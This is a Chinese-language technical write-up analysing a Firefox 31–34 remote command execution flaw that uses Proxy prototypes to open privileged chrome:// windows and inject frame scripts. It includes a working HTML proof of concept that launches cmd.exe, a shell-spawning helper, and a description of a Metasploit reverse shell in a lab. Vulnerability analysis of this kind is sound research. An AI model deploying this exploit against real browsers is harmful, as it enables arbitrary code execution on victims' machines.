# Firefox 31~34远程命令执行漏洞的分析

0x00 前言
=======

* * *

前段时间，二哥在很多浏览器中将脚本层面的漏洞提升为远程命令执行，几乎日遍市面上所有国产浏览器，这成为了许多人津津乐道的话题。确实，在当今这个底层安全防护越来越强的环境下，堆栈溢出、UAF造成的漏洞利用起来变得很困难，但如果借助浏览器提供的一些脚本层接口做到RCE，将是一个是两拨千金的过程。

CVE-2014-8638就是这样一个漏洞，而且影响到的不是国(shan)产(zhai)浏览器，而是大名鼎鼎的Firefox。它也是javascript逐步进入ECMAScript 6时代后遇到的一个比较有意思的漏洞。

0x01 漏洞的发现
==========

* * *

Firefox是较早引入ECMAScript 6特性的浏览器，[Proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)就是一个ECMAScript 6特性，它可以用来hook javascript原生的get/set方法。比如如下代码：

```
var x = {};  
var p = Proxy(x, {  
  get: function() {  
    console.log('getter called!');  
    return 'intercepted';  
  },  
  set: function() {  
    console.log('setter called!');  
  }  
});  

console.log(p.foo);  
p.bar = 1;

```

执行后将会得到如下结果：

![enter image description here](http://drops.javaweb.org/uploads/images/24da77d75576069afe01241810c6ca6f3b9c797f.jpg)

这个方法为javascript注入了新的血液，但也带来了新的安全问题。Getter和Setter将导致我们将没有特权的javascript代码注入到有特权的javascript代码之前，这些代码在后面检查权限的函数之前，所以他们是有特权的。Chrome下也出现过由于这个原因导致的问题：[LINK1](https://code.google.com/p/chromium/issues/detail?id=351787)，[LINK2](http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/)，大家也可以下去自己研究一下。

经过作者的研究，当我们把Proxy对象作为其他对象的prototype时，就会出现一些问题，比如如下代码就能宕掉服务器：

```
document.__proto__ = Proxy.create({getPropertyDescriptor:function(){ while(1) {} }});  

```

不过除此之外，作者当时并没有想到更好的利用方法，所以就提交到mozilla官方了，firefox在35版本修复了这个问题。

0x02 突破点
========

* * *

作者后来做了如下尝试：

```
var props = {};  
props['has'] = function(){  
  var chromeWin = open("chrome://browser/content/browser.xul", "x")();  
};  
document.__proto__ = Proxy.create(props)  

```

惊奇的发现，当我们在Proxy中，尝试打开一个特权页面“chrome://browser/content/browser.xul”的时候，居然只是弹出了“阻止窗口弹出”的提醒。这说明特权页面是可以被轻易打开的，这个提醒也可以通过点击页面的方式绕过。

0x03 chrome:意味着什么
=================

* * *

我们能够打开一个域为chrome://browser/content/browser.xul的页面，以为着什么？

火狐和其他很多浏览器一样，都有自己的特权域。不同的URI schemes意味着不同的权限。Chromium的特权域是chrome://downloads，Safari的是file://。Firefox的特权域是chrome://，只要在这个域下的javascript拥有浏览器的最高权限。所以我们能用这样的javascript干很多事，比如执行shell命令。

你可以试着打开chrome://browser/content/browser.xul并在控制台下执行如下代码（linux/osx）：

```
function runCmd(cmd) {  
    var process = Components.classes["@mozilla.org/process/util;1"]  
              .createInstance(Components.interfaces.nsIProcess);  
    var sh = Components.classes["@mozilla.org/file/local;1"]  
            .createInstance(Components.interfaces.nsILocalFile);  
    sh.initWithPath("/bin/sh");  
    process.init(sh);  
    var args = ["-c", cmd];  
    process.run(true, args, args.length);  
}  
runCmd("touch /tmp/owned"); 

```

执行后，可以发现/tmp/owned已经创建，touch命令执行成功。

所以，一旦攻击者能够将代码注入到这个页面，就可以执行任意命令了。

0x04 注入代码
=========

* * *

那么怎么注入代码到这个页面？

众所周知，浏览器同源策略（SOP）将不会允许我们在http://attacker域下注入代码到chrome://browser域下。非常幸运的是，作者以前就做过类似的研究：[LINK](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/browser/firefox_webidl_injection.rb)

当open的第三个参数有传入”chrome”的话，并且在拥有特权的[docshell](http://www-archive.mozilla.org/projects/embedding/docshell.html)下调用，那么我们的URL就会以“top-level frame”的形式被打开（形似“首选项”那种页面），并且没有传统的document对象（就是一个白白的面板）。这样的窗口，拥有一个messageManager属性，能够访问其他docshell（特权是通行的~嘿）：

```
// abuse vulnerability to open window in chrome://  
var c = new mozRTCPeerConnection;  
c.createOffer(function(){},function(){  
    var w = window.open('chrome://browser/content/browser.xul', 'top', 'chrome');  

    // we can now reference the `messageManager` property of the window's parent  
    alert(w.parent.messageManager)  
});  

```

messageManager是firefox中的特权API，能够在线程间传递信息。同样，javascript也是可以传递的，方式是使用loadFrameScript函数。

0x05 命令执行
=========

* * *

作者其实这块写的特别简略，直接告诉我可以怎样写metasploit exploit，可明明POC都没告诉我呀！！对于我这种没开发过firefox插件、没读过源码的通知简直就……我想到一张操蛋的图：

![enter image description here](http://drops.javaweb.org/uploads/images/1af6fd60259291ab7358dd75f34d8750f9619744.jpg)

对，就像这样……

于是我更新了metasploit，生成了一个exploit来研究。得出了如下的POC：

```
<!doctype html>
<html>
<body>
<script>
var opts = {"zqwessa123": "\n         (function(){var process = Components.classes[\"@mozilla.org/process/util;1\"].createInstance(Components.interfaces.nsIProcess);var sh = Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);sh.initWithPath(\"C:\\\\windows\\\\system32\\\\cmd.exe\");process.init(sh);\nvar shell='calc.exe';var args = [\"\/c\", shell];\n process.run(true, args, args.length);})();\n\n"};
var key = opts['zqwessa123'];
var props = {};
props.has = function(n){
    if (!window.top.x && n=='nodeType') {
      window.top.x=window.open("chrome://browser/content/browser.xul", "x",
        "chrome");
      if (window.top.x) {
        Object.setPrototypeOf(document, pro);
        setTimeout(function(){
          x.location='data:text/html,<iframe mozbrowser src="about:blank"></iframe>';
          setTimeout(function(){
            x.messageManager.loadFrameScript('data:,'+key, false);
            setTimeout(function(){
                x.close();
            },100);
          }, 100)
        }, 100);
      }
    }
}
var pro = Object.getPrototypeOf(document);
Object.setPrototypeOf(document, Proxy.create(props));
</script>

  The page has moved. <span style='text-decoration:underline;'>Click here</span> to be redirected.
</body>
</html>

```

过程还是比较简单，首先创建Proxy对象，实现has方法，has方法实际上就是hook了对象的“in”操作，具体可见Proxy文档。然后将document的prototype设置为Proxy对象，这样实际上我们接管了document的in操作，并且这些代码是有特权的。

使用之前讲的方法打开chrome://browser/content/browser.xul，获得了messageManager属性，用data协议构造了一个iframe，并将要执行的javascript代码也以data协议的形式用messageManager. loadFrameScript加载，执行特权API。

注意，因为在docshell中，所以是没有传统的window对象、document对象，所以你调用alert、console等方法是没用的。opts对象中的那一串javascript就是最后执行的特权API，通过process.run执行C:\windows\System32\cmd.exe /c calc.exe，效果是弹出一个小计算器：

![enter image description here](http://drops.javaweb.org/uploads/images/74641914a7d74886b280e894bf564668faa99101.jpg)

一个简单的POC就此诞生了。

然后，不得不说metesploit中的 firefox_proxy_prototype模块，通过这个模块生成的exploit可以直接反弹shell。

![enter image description here](http://drops.javaweb.org/uploads/images/5046644d9d3edb9a31f15970aded195eae038356.jpg)

虚拟机10.211.55.3上Firefox版本是33，在影响范围内，打开http:// 10.211.55.2:12306/m0EbugSmqwCW1PP ，随意点击一处，即可触发。

主机上等待上线：

![enter image description here](http://drops.javaweb.org/uploads/images/86de39a83c722a3c40bc73f54251a3d42b27e05a.jpg)

这边反弹成功，可以看到，已经拿下10.211.55.3的用户权限shell。

0x06 资料
=======

* * *

原文：[LINK](https://community.rapid7.com/community/metasploit/blog/2015/03/23/r7-2015-04-disclosure-mozilla-firefox-proxy-prototype-rce-cve-2014-8636)

测试的FF33我在这里下载的：[LINK](http://dl.pconline.com.cn/html_2/1/104/id=42964&pn=0.html)

Windows下的POC：[LINK](http://mhz.pw/game/firefox/firefox.html)

一个小演示：[LINK](https://www.youtube.com/watch?v=18xCIXkhF-E)

还有很多点，作者虽然没在本文说明，但基本都可以从作者文章链接所指向的文章看到。显然作者对浏览器漏洞的研究是一个过程，就像一部动漫，如果你不看前面的部分，这部分内容就可能比较难懂。